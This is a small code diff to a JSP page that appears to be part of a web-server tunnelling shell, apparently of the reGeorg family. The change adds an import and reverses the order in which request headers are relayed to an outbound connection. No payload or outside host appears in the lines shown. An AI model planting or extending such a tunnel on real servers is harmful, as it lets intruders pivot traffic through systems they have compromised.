@@ -1,4 +1,4 @@
-<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*"%>
+<%@page import="java.nio.ByteBuffer, java.nio.channels.SocketChannel, java.io.*, java.net.*, java.util.*"%>
 <%!
     private static char[] en = "BASE64 CHARSLIST".toCharArray();
     public static String b64en(byte[] data) {
@@ -98,9 +98,10 @@
         // conn.setConnectTimeout(200);
         // conn.setReadTimeout(200);
 
-        java.util.Enumeration enu=request.getHeaderNames();
-        while(enu.hasMoreElements()){
-            String key=(String)enu.nextElement();
+        Enumeration enu = request.getHeaderNames();
+        List<String> keys = Collections.list(enu);
+        Collections.reverse(keys);
+        for (String key : keys){
             if (!key.equalsIgnoreCase(urlheader)){
                 String value=request.getHeader(key);
                 conn.setRequestProperty(headerkey(key), value);
